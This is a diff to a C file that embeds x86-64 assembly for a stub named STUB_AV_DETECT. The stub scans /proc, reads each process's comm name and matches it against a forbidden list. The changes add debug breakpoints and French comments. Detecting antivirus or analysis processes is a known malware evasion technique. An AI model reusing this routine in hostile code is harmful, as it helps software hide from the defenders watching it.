@@ -51,27 +51,29 @@ static const char STUB_POLY_DEMO_BLOCKS[] =
 
 static const char STUB_AV_DETECT[] =
 "_start:\n"
-    //; [rsp+0..4095]    = buffer (4096)
-    //; [rsp+4096..4351] = process_name (256)
+    //; [rsp+0..4095]    = buffer getdents64 (4096)
+    //; [rsp+4096..4351] = process_name / comm (256)
     //; [rsp+4352..4415] = path_buffer (64)
 "sub rsp, 4416\n"
 
-    //; Ouvrir /proc
+    //; ── B1 : sys_open("/proc", O_DIRECTORY) ──
 "mov rax, 2\n"
 "lea rdi, [proc_path]\n"
 "mov rsi, 0x10000\n"
 "syscall\n"
+"break\n"              //; [B1] rax = proc_fd (>= 3) ou erreur (< 0)
 "cmp rax, 0\n"
 "jl exit_error\n"
 "mov r12, rax\n"
 
 "scan_loop:\n"
-"mov rax, 78\n"         //; sys_getdents64
+    //; ── B2 : sys_getdents64 ──
+"mov rax, 78\n"
 "mov rdi, r12\n"
 "mov rsi, rsp\n"
 "mov rdx, 4096\n"
 "syscall\n"
-"break\n"
+"break\n"              //; [B2] rax = nb octets lus ; rbx = fin ; rbp = debut
 "cmp rax, 0\n"
 "jle exit_clean\n"
 
@@ -83,13 +85,14 @@ static const char STUB_AV_DETECT[] =
 "cmp rbp, rbx\n"
 "jge scan_loop\n"
 
-    //; Garder uniquement les noms commençant par '0'..'9' ([rbp+19])
+    //; Filtre PID : d_name[0] dans ['0'..'9'] (ASCII 48..57) à [rbp+19]
 "_ZERO eax\n"
 "_SET al, [rbp+19]\n"
 "cmp al, 48\n"
 "jl next_entry\n"
 "cmp al, 57\n"
 "jg next_entry\n"
+"break\n"              //; [B3] entree PID retenue : al = premier chiffre, rbp = dirent
 
     //; Construire "/proc/<PID>/comm" dans [rsp+4352]
 "lea rdi, [rsp]\n"
@@ -122,6 +125,7 @@ static const char STUB_AV_DETECT[] =
 "_INC rdi\n"
 "cmp al, 0\n"
 "jne copy_suffix\n"
+"break\n"              //; [B4] chemin "/proc/<pid>/comm" construit a [rsp+4352]
 
     //; Ouvrir /proc/<pid>/comm
 "mov rax, 2\n"
@@ -148,14 +152,15 @@ static const char STUB_AV_DETECT[] =
 "syscall\n"
 
 "pop rax\n"
+"break\n"              //; [B5] rax = nb octets lus dans comm ; [rsp+4096] = contenu
 "cmp rax, 0\n"
 "jle next_entry\n"
+
+    //; Terminer par '\0' et retirer '\n' (10)
 "lea rsi, [rsp]\n"
 "add rsi, 4096\n"
 "_ZERO rcx\n"
 "_STORE [rsi + rax], cl\n"
-
-    //; Remplacer '\n' (10) par '\0' (0)
 "strip_newline:\n"
 "_SET al, [rsi]\n"
 "cmp al, 0\n"
@@ -200,6 +205,7 @@ static const char STUB_AV_DETECT[] =
 "je next_entry\n"
 "lea rdi, [rsp]\n"
 "add rdi, 4096\n"
+"break\n"              //; [B6] avant strcmp : rdi = comm, rsi = entree forbidden_list
 "call strcmp\n"
 "test rax, rax\n"
 "jz found_forbidden\n"
@@ -217,6 +223,7 @@ static const char STUB_AV_DETECT[] =
 "shl eax, 8\n"
 "_SET al, [rbp+16]\n"
 "add rbp, rax\n"
+"break\n"              //; [B7] apres d_reclen : eax = reclen, rbp = entree suivante
 "jmp process_entry_loop\n"
 
 "found_forbidden:\n"
